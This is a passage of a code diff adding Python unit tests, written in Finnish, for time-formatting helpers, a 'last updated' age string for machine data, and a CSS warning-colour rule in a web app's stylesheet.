+    assert lyhyt_aika(nyt.isoformat()) == "klo\u00a020.05"
+    eilen = nyt - timedelta(days=1)
+    assert lyhyt_aika(eilen.isoformat()) == f"{eilen.day}.{eilen.month}.\u00a0klo\u00a020.05"
+    assert lyhyt_aika("2026-11-18T21:14:00") == "" and lyhyt_aika(None) == ""   # ilman vyöhykettä ei arvata
+
+
+def test_koneen_ika_ymmarrettavasti():
+    from types import SimpleNamespace as K
+    assert koneen_ika(K(ika_s=20, vanhentunut=False, paivitetty="")) == "päivitetty 20 s sitten"
+    assert koneen_ika(K(ika_s=None, vanhentunut=True, paivitetty="")) == "päivitysaika ei tiedossa"
+    assert koneen_ika(K(ika_s=1500, vanhentunut=True, paivitetty="")) == "päivitetty 25 min sitten"
+    assert koneen_ika(K(ika_s=7300, vanhentunut=True, paivitetty="")) == "päivitetty 2 h sitten"
+    vanha = K(ika_s=27937 * 60, vanhentunut=True, paivitetty="2026-10-30T10:00:00+00:00")
+    assert koneen_ika(vanha) == "päivitetty 30.10.\u00a0klo\u00a012.00"
+
+
+def test_vanhentunut_konetieto_varoittaa_ja_himmenee():
+    """Vanhentuneen konetiedon reunateksti on varoitusvärinen: tyylin pitää voittaa .label .aside -väri."""
+    css = (PACKAGE_DIR / "static" / "app.css").read_text(encoding="utf-8")
+    assert ".label .aside.warn { color: var(--warn); }" in css
